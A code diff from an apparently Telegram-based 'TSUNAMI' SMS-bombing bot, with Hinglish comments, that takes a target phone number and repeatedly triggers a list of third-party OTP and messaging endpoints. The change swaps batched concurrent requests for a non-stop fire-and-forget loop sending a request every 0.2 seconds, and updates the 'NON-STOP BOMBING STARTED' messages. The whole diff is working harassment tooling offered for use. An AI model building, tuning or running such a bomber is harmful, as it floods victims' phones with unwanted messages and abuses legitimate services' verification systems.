@@ -22,10 +22,9 @@ BOT_TOKEN       = os.environ.get("BOT_TOKEN", "")
 WEBHOOK_URL     = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
 PORT            = int(os.environ.get("PORT", 8000))
 
-# FAST + CONTINUOUS CONFIG
-CONCURRENCY     = 40   # 40 requests ek saath (Speed wapas)
-DELAY           = 0.1  # 0.1 second ka gap (Continuous flow)
-REQUEST_TIMEOUT = 5    # Jaldi fail ho taaki loop na ruke
+# NON-STOP CONTINUOUS CONFIG
+TIME_GAP        = 0.2  # Har 0.2 second mein ek nayi API (Non-stop flow)
+REQUEST_TIMEOUT = 5    # Jaldi fail ho taaki flow na ruke
 # ============================================
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
@@ -42,8 +41,6 @@ def is_valid_target(num: str) -> bool:
 #  A TO Z APIS (Diljot Bomber + Tsunami Merged)
 # =========================================================================
 def build_endpoints():
-    UA_C = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36"
-    UA_O = "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5"
     UA_C2 = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
     UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
     
@@ -356,16 +353,11 @@ async def fire_endpoint(ep: dict, target: str) -> bool:
     except Exception:
         return False
 
-async def _fire_batch(batch, target):
-    tasks = [fire_endpoint(ep, target) for ep in batch]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    return sum(1 for r in results if r is True)
-
 # ================== BUTTON HANDLERS ==================
 async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     keyboard = [[InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bomb")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    text = "🌊 **TSUNAMI ULTRA FAST** 🌊\n\nClick below to begin."
+    text = "🌊 **TSUNAMI NON-STOP** 🌊\n\nClick below to begin."
     await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
 
 async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
@@ -403,14 +395,14 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        f"🔥 **BOMBING STARTED** 🔥\n\n🎯 Target: `{text}`\n🔌 Endpoints: {len(ENDPOINTS)}\n⚡ Status: Ultra Fast Mode...",
+        f"🔥 **NON-STOP BOMBING STARTED** 🔥\n\n🎯 Target: `{text}`\n🔌 Endpoints: {len(ENDPOINTS)}\n⚡ Status: Continuous Flow...",
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
     
     asyncio.create_task(run_bombing(uid, s))
 
-# ================== BOMBING LOGIC (ULTRA FAST CONTINUOUS) ==================
+# ================== BOMBING LOGIC (NON-STOP WATERFALL) ==================
 async def run_bombing(uid: int, s: dict):
     target = s["target"]
     sent = 0
@@ -420,19 +412,18 @@ async def run_bombing(uid: int, s: dict):
     try:
         while s.get("running"):
             s["round"] += 1
-            batch = []
-            for _ in range(CONCURRENCY):
-                batch.append(ENDPOINTS[idx % len(ENDPOINTS)])
-                idx += 1
-
-            ok = await _fire_batch(batch, target)
-            sent += ok
+            
+            # Ek ke baad ek API trigger karo bina ruke
+            ep = ENDPOINTS[idx % len(ENDPOINTS)]
+            idx += 1
+            
+            # Fire and forget (Background mein chalao)
+            asyncio.create_task(fire_endpoint(ep, target))
+            sent += 1
             s["sent"] = sent
             
-            if ok == 0:
-                await asyncio.sleep(1.0) 
-            else:
-                await asyncio.sleep(DELAY)
+            # TIME_GAP ke baad agli API
+            await asyncio.sleep(TIME_GAP)
                 
     except Exception as e:
         logger.exception(f"Bombing error: {e}")
